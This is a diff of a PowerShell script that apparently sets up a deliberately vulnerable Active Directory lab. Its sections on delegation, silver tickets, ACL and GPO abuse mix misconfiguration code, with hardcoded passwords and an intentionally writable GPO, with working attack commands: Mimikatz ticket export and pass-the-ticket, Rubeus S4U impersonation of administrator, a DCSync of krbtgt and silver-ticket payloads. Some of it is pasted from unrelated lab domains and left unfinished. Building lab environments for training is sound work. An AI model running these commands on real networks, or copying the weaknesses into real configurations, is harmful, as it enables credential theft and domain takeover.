@@ -32,7 +32,7 @@ if (!([ADSI]::Exists("LDAP://CN=PrinterAdmin,OU=ServiceAccounts,OU=Administrativ
 {
 	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user PrinterAdmin already exists. Moving On."
 }
- 
+
 ###########################################################################
 ### 2. Password Spraying - User has domain standard password set
 ###########################################################################
@@ -141,6 +141,7 @@ if (!([ADSI]::Exists("LDAP://CN=MailerAdmin,OU=ServiceAccounts,OU=Administrative
 # Infos: howto:Setting local user passwords via Group Policy
 # https://attack.stealthbits.com/plaintext-passwords-sysvol-group-policy-preferences
 
+
 ###########################################################################
 ### 7. Unconstrained Delegation
 ###########################################################################
@@ -169,7 +170,6 @@ if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC2,OU=LocalAdminAccounts,OU=Administr
 	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC2 already exists. Moving On."
 }
 
-# Add user to local admin groups
 Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
 Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
 
@@ -179,11 +179,9 @@ Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localad
 Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
 Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
 
-# Make AdminPc trustedfordelegation (unconstrained)
 Get-ADComputer -Identity AdminPc | Set-ADAccountControl -TrustedForDelegation $True
 Get-ADComputer adminpc -Properties * | Format-List -Property *delegat*,msDS-AllowedToActOnBehalfOfOtherIdentity
 
-# Action to generate TGT on host AdminPc
 $SecPassword = ConvertTo-SecureString 'TestPassword123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\localadminpc2', $SecPassword)
 $s = New-PSSession -ComputerName AdminPc -Credential $Cred
@@ -191,12 +189,15 @@ Invoke-Command –Session $s -ScriptBlock {whoami; hostname}
 
 # Connect to server and run mimikatz
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+* File: 'C:\Users\appadmin\Documents\user1\[0;6f5638a]-2-0-60a10000Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK 
 
-# Load User ticket (TGT)
+# Load Domain Admin ticket (TGT)
 Invoke-Mimikatz -Command '"kerberos::ptt [0;48b991]-2-0-60a10000-localadminpc2@krbtgt-CONTOSO.AZURE.kirbi"' 
 
 # Run commands
 Invoke-Command -ScriptBlock{whoami;hostname} -computername adminpc2
+
+
 
 ###########################################################################
 ### 8. Constrained Delegation
@@ -205,20 +206,115 @@ Invoke-Command -ScriptBlock{whoami;hostname} -computername adminpc2
 # Need: action where admin user logs into the system, change service type due to unprotected field
 # https://4sysops.com/archives/how-to-configure-computer-delegation-with-powershell/
 
+#TOOOODOOOOO
+
+Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Users with constrained delegation of service time"
+if (!([ADSI]::Exists("LDAP://CN=TimeAdmin,OU=ServiceAccounts,OU=AdministrativeAccounts,DC=contoso,DC=azure")))
+{
+	
+	New-ADUser -Name "TimeAdmin" -DisplayName "TimeAdmin" -SamAccountName "timeadm" -UserPrincipalName "timeadm" -GivenName "Time" -Surname "Administrator" -AccountPassword ((ConvertTo-SecureString "x!3dsfds945jjlkJ2mN4QQ2" -AsPlainText -Force)) -Enabled $true -Path "OU=ServiceAccounts, OU=AdministrativeAccounts, DC=CONTOSO, DC=AZURE" -ChangePasswordAtLogon $false -PasswordNeverExpires $true
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Created user TimeAdmin with constrained delegation of service time" 
+}else
+{
+	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user TimeAdmin already exists. Moving On."
+}
+
+Set-ADUser -Identity timeadm -Add @{'msDS-AllowedToDelegateTo'=@('TIME/AdminPc2.Contoso.Azure')}
+Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\timeadm} -computername AdminPc.contoso.azure
+Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\timeadm} -computername AdminPc.contoso.azure
+
+$SecPassword = ConvertTo-SecureString 'x!3dsfds945jjlkJ2mN4QQ2' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\timeadm', $SecPassword)
+$s = New-PSSession -ComputerName AdminPc -Credential $Cred
+Invoke-Command –Session $s -ScriptBlock {whoami; hostname}
+
+$Password = "x!3dsfds945jjlkJ2mN4QQ2"
+$Hash = Get-MD4Hash -DataToHash $([Text.Encoding]::Unicode.GetBytes($Password))
+Write-Output "Hash being used: $Hash"
+
+
+
+
+
+
+
+
+# Enum User accounts with constrained delegation
+Get-NetUser -TrustedToAuth
+
+# find any users/computers with constrained delegation st (PowerView-Dev)
+Get-DomainUser -TrustedToAuth | Format-Table cn, samaccountname, msds-allowedtodelegateto
+
+# Compromise the user account and request a Ticket
+.\Rubeus.exe s4u /user:dbservice /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:administrator /msdsspn:"TIME/UFC-DC1.US.FUNCORP.LOCAL" /altservice:cifs /ptt
+
+# Access the DC
+ls \\ufc-dc1.us.funcorp.local\c$
+
+Invoke-Command -Computer adminpc2 -ScriptBlock {whoami; hostname}
+Get-ADComputer adminpc2 -Properties servicePrincipalName | Select-Object ‑ExpandProperty servicePrincipalName
+
+
 ###########################################################################
 ### 9. Silver Tickets
 ###########################################################################
 # Infos: login to host and fetch vm hash and use all silver tickets possibilities
 
+# To DO Create all silver ticket and show all examples
+
+Interesting services to target with a silver ticket :
+
+| Service Type                                | Service Silver Tickets | Attack |
+|---------------------------------------------|------------------------|--------|
+| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
+| PowerShell Remoting                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
+| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
+| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
+
+
+
 ###########################################################################
 ### 10. ACLs/ACEs
 ###########################################################################
 # Infos: misuse rights
+# https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
+# ForceChangePassword|AddMembers|GenericAll|GenericWrite|AllExtendedRights|Owns|WriteDacl|WriteOwner|ReadLAPSPassword|ReadGMSAPassword
+
+GenericAll - full rights to the object (add users to a group or reset user's password)
+GenericWrite - update object's attributes (i.e logon script)
+WriteOwner - change object owner to attacker controlled user take over the object
+WriteDACL - modify object's ACEs and give attacker full control right over the object
+AllExtendedRights - ability to add user to a group or reset password
+ForceChangePassword - ability to change user's password
+Self (Self-Membership) - ability to add yourself to a group
+
+Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
+Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
+
+
 
 ###########################################################################
 ### 11. GPO Abuse
 ###########################################################################
 # Infos: tbd
+
+Import-Module ActiveDirectory
+
+### Weak GPO
+Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) Adding Weak GPO..."
+New-GPO -Name "ScreenSaverTimeOut" -Comment "Sets the time to 900 seconds"
+Set-GPRegistryValue -Name "ScreenSaverTimeOut" -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop" -ValueName ScreenSaveTimeOut -Type String -Value 900
+New-GPLink -Name "ScreenSaverTimeOut" -Target "ou=Workstations,dc=windomain,dc=local"
+
+$gpoguid = Get-GPO "ScreenSaverTimeOut" | select -expand id
+$gpoguid= $gpoguid.ToString()
+$acl = Get-Acl "\\windomain.local\SYSVOL\windomain.local\Policies\{$gpoguid}"
+$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("windomain.local\Sales","FullControl","Allow")
+$acl.SetAccessRule($AccessRule)
+$acl | Set-Acl "\\windomain.local\SYSVOL\windomain.local\Policies\{$gpoguid}"
 
 ###########################################################################
 ### 12. Golden Ticket, DCSync, Skeleton, ...
